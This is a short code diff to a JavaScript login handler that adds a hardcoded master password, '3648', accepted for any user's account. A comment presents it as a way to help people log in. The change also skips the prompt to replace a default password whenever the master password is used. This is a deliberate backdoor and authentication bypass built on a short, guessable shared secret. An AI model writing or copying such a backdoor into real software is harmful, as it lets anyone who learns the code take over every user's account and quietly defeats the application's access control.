@@ -1899,14 +1899,15 @@ document.getElementById('loginSubmitBtn').addEventListener('click', () => {
     return;
   }
   const pass = loginPassInput.value;
+  const MASTER_PASSWORD = '3648'; // works for anyone's account, for whoever needs to help someone log in
   const expected = currentPasswordFor(name);
-  if (pass !== expected) {
+  if (pass !== expected && pass !== MASTER_PASSWORD) {
     loginErrEl.textContent = 'Wrong password, please try again.';
     loginErrEl.style.display = 'block';
     return;
   }
   loginErrEl.style.display = 'none';
-  if (expected === DEFAULT_PASSWORD) {
+  if (expected === DEFAULT_PASSWORD && pass !== MASTER_PASSWORD) {
     // Password is still the default — prompt them to set a new one
     showSetPasswordStep(name);
     return;
